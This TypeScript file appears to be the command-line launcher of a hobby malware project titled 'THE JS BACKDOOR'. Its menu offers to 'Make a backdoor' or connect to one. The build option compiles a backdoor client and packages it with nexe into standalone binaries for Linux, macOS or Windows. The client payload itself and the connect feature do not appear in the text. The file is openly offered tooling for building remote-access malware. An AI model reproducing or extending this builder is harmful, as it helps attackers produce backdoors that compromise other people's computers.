/* eslint-disable @typescript-eslint/ban-ts-ignore */
// import ascii from 'ascii-art';
import boxen from 'boxen';
import 'colors';
// @ts-ignore
import {select} from 'input';
import {exec} from 'child-process-promise';
import cwd from 'cwd';
import {compile} from 'nexe';
import {windowClear} from './helpers';
windowClear();
(async () => {
  console.log(
    boxen(
      `  _____ _   _ _____       _ ____    ____    _    ____ _  ______   ___   ___  ____
 |_   _| | | | ____|     | / ___|  | __ )  / \\  / ___| |/ /  _ \\ / _ \\ / _ \\|  _ \\
   | | | |_| |  _|    _  | \\___ \\  |  _ \\ / _ \\| |   | ' /| | | | | | | | | | |_) |
   | | |  _  | |___  | |_| |___) | | |_) / ___ \\ |___| . \\| |_| | |_| | |_| |  _ <
   |_| |_| |_|_____|  \\___/|____/  |____/_/   \\_\\____|_|\\_\\____/ \\___/ \\___/|_| \\_\\
`,
      {padding: 1}
    ).blue
  );
  console.log('==========================='.red);
  console.log('|   made by jabster28 :)  |'.red);
  console.log('==========================='.red);
  console.log('\n\n');

  console.log(
    boxen(
      `    ████████████████████████
    ████████████████████████
    ████████████████████████
    ████████████████████████
    ████████████████████████
    ██████████  ████    ████   big thanks to the creator of this 
    ██████████  ██  ████████   guy, great language :DDDD
    ██████████  ████    ████
    ██████████  ████████  ██
    ██████████  ██  ████  ██
    ██████    ██████    ████
    ████████████████████████\n\n`,
      {padding: 1}
    ).yellow
  );

  select("So, what's tickling your fancy today?", [
    'Make a backdoor',
    'Already made a backdoor? Connect to it now',
    'Config',
  ]).then(async (e: string) => {
    switch (e) {
      case 'Make a backdoor':
        select('What architecture would you want to target?', [
          'linux',
          'darwin',
          'windows',
        ]).then(async (a: string) => {
          console.log(boxen('Compiling TS backdoor to JS...').gray);
          try {
            await exec('tsc');
            console.log(boxen('Done!').green);
          } catch (error) {
            console.log(boxen('ERROR!!!').red);
            console.error(error);
          }
          console.log(boxen('Packaging JS backdoor to binary...').gray + '\n');
          try {
            compile({
              targets: [a],
              input: cwd() + '/build/client.js',
              output: 'build/' + a,
            });
          } catch (error) {
            console.log(boxen('ERROR!!!').red);
            console.error(error);
          }
        });
        break;

      default:
        console.log('dafuq iz dis');
        break;
    }
  });
})();
